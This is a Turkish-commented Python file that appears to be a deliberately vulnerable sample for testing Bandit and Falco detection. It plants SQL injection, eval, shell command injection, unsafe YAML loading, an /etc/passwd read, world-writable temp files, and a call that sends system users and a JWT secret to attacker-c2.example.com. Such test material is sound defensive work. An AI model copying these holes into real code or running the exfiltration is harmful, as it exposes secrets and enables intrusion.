"""
Kullanıcı Yönetim Sistemi - main.py
Hiring case: Verilen kullanıcı listesini işle ve rapor üret.
"""

import sqlite3
import subprocess
import requests
import os
import yaml
import json
from config import DB_PASSWORD, JWT_SECRET, DEBUG

# ─────────────────────────────────────────────────────
# ZAFIYET 1: SQL Injection (Bandit: B608)
# Kullanıcıdan gelen input direkt sorguya ekleniyor
# ─────────────────────────────────────────────────────
def get_user(username):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()

    # YANLIŞ: string formatlama ile sorgu oluşturma
    query = "SELECT * FROM users WHERE username = '" + username + "'"
    cursor.execute(query)   # Bandit B608: SQL injection
    return cursor.fetchall()


# ─────────────────────────────────────────────────────
# ZAFIYET 2: eval() ile dinamik kod çalıştırma (Bandit: B307)
# Kullanıcı girdisi doğrudan eval'e veriliyor
# ─────────────────────────────────────────────────────
def calculate_score(formula):
    # YANLIŞ: eval ile kullanıcı girdisi çalıştırma
    result = eval(formula)   # Bandit B307: eval kullanımı
    return result


# ─────────────────────────────────────────────────────
# ZAFIYET 3: subprocess shell=True (Bandit: B602)
# Komut enjeksiyonuna açık
# ─────────────────────────────────────────────────────
def generate_report(user_id):
    # YANLIŞ: shell=True + değişken birleştirme
    cmd = "echo 'Rapor: ' && cat /tmp/report_" + str(user_id) + ".txt"
    output = subprocess.check_output(cmd, shell=True)   # Bandit B602
    return output


# ─────────────────────────────────────────────────────
# ZAFIYET 4: Güvensiz YAML deserialization (Bandit: B506)
# yaml.load() ile arbitrary code execution mümkün
# ─────────────────────────────────────────────────────
def parse_config(yaml_content):
    # YANLIŞ: yaml.load() yerine yaml.safe_load() kullanılmalı
    data = yaml.load(yaml_content, Loader=yaml.Loader)   # Bandit B506: unsafe yaml
    return data


# ─────────────────────────────────────────────────────
# ZAFIYET 5: Hassas sistem dosyası okuma
# Falco: "Sensitive File Read" kuralını tetikler
# ─────────────────────────────────────────────────────
def get_system_users():
    # /etc/passwd okuma → Falco alarmı
    with open("/etc/passwd", "r") as f:
        users = f.read()
    return users


# ─────────────────────────────────────────────────────
# ZAFIYET 6: Outbound HTTP bağlantısı
# Falco: "Outbound Connection Attempt" + tcpdump yakalar
# İzole network'te bağlantı başarısız olur ama attempt görünür
# ─────────────────────────────────────────────────────
def send_telemetry(data):
    try:
        # Dışarı veri sızdırma girişimi → Falco + tcpdump alarm
        response = requests.post(
            "http://attacker-c2.example.com/collect",
            json={"data": data, "secret": JWT_SECRET},
            timeout=5
        )
        return response.status_code
    except Exception:
        pass


# ─────────────────────────────────────────────────────
# ZAFIYET 7: Hardcoded temporary file + insecure permissions
# Bandit: B108
# ─────────────────────────────────────────────────────
def save_temp_report(content):
    # YANLIŞ: tahmin edilebilir sabit path + herkes okuyabilir
    path = "/tmp/report_output.txt"     # Bandit B108: insecure temp file
    with open(path, "w") as f:
        os.chmod(path, 0o777)           # Bandit B103: insecure file permissions
        f.write(content)
    return path


# ─────────────────────────────────────────────────────
# ANA AKIŞ
# ─────────────────────────────────────────────────────
if __name__ == "__main__":
    print("Kullanıcı yönetim sistemi başlatılıyor...")

    # Sistem kullanıcılarını çek (Falco alarm)
    sys_users = get_system_users()
    print(f"Sistem kullanıcı sayısı: {len(sys_users.splitlines())}")

    # Telemetri gönder (tcpdump + Falco alarm)
    send_telemetry({"users": sys_users[:100]})

    # Örnek sorgu (SQLi açığı)
    results = get_user("admin' OR '1'='1")
    print(f"Sorgu sonucu: {results}")

    # Rapor kaydet
    save_temp_report("Test raporu içeriği")

    # Score hesapla (eval açığı)
    score = calculate_score("2 + 2")
    print(f"Score: {score}")

    print("İşlem tamamlandı.")
